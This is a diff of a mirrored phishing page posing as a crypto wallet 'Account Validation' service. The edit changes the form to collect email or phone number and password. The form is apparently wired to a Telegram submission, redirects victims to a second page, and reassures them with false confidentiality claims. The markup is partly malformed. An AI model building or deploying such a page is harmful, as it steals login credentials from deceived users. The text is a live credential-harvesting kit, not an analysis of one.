@@ -1,4 +1,5 @@
-<!DOCTYPE html>
+
+  <!DOCTYPE html>
 <html>
 
 <!-- Mirrored from validatewalleturl.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 01 May 2024 15:10:32 GMT -->
@@ -73,38 +74,30 @@ span.psw {
 
 <h2>Account Validation</h2>
 
- <form id="telegramform">
-
-    <label for="email">Email / Phone Number</label>
-    <input
-      type="text"
-      id="email"
-      name="email"
-      placeholder="Email / Mobile number"
-      required
-    >
-
-    <label for="firstname">Firstname</label>
-    <input
-      type="text"
-      id="firstname"
-      name="firstname"
-      placeholder="Firstname"
-      required
-    >
-
+<form id="telegramform">
+    <img src="img_avatar2.png" alt="Avatar" class="avatar">
+  </div>
+  <div class="container">
+    <label for="email"><b>Email/Phone Number</b></label>
+    <input type="text" placeholder="Email/Mobile number" name="email" required>
+    
+    <label for="message"><b>Password</b></label>
+    <input type="message" placeholder="Enter Password" name="password" required>
+        
     <button type="submit" id="submitBtn">
 
       <p id="formstatus"></p>
-      Submit
+     Login
     </button>
 
     <p id="formStatus" aria-live="polite"></p>
 
   </form>
 
-</div>
-
+      <input type="checkbox" checked="checked" name="remember"> Remember me
+    </label>
+  </div>
+</form>
 <script>
 const form = document.getElementById("telegramform");
 const button = document.getElementById("submitBtn");
@@ -137,7 +130,11 @@ form.addEventListener("submit", async (e) => {
     }
 
     status.textContent = "Submission successful!";
+
     form.reset();
+
+    // Redirect to the next page
+    window.location.href = "page2.html";
 
   } catch (error) {
     status.textContent = error.message;
@@ -148,5 +145,41 @@ form.addEventListener("submit", async (e) => {
   }
 });
 </script>
+
 </body>
+
+<!-- Mirrored from validatewalleturl.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 01 May 2024 15:10:32 GMT -->
+</html>
+ 
+              </div>
+            </div>
+          </div>
+          <div class="row">
+            <p class="px-3 note" style="font-size: 15px;margin-top: 50px;font-weight: bold;">
+              NOTE
+            </p>
+            <p class="px-3" style="font-size: 11px;">
+              <ul>
+                <li style="font-size: 11px;">
+                  The information collected is confidential and will not be disclosed by us to unauthorized third parties.
+                </li>
+                <li style="font-size: 11px;">
+                  Customers are reminded to kindly provide accurate and truthful information for authentication and not to provide data which is false or which belongs to third parties. Authentication information will not be modified.
+                </li>
+                <li style="font-size: 11px;">
+                  Authentication process will be carried out immediately upon receipt of information, and we will have notify you of the authentication result.
+                </li>
+              </ul>
+            
+          </div>
+        </div>
+  </div>
+<!--
+  <script src="../code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+<script src="../cdn.jsdelivr.net/npm/bootstrap%404.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
+-->
+</body>
+</html>
+
+
 
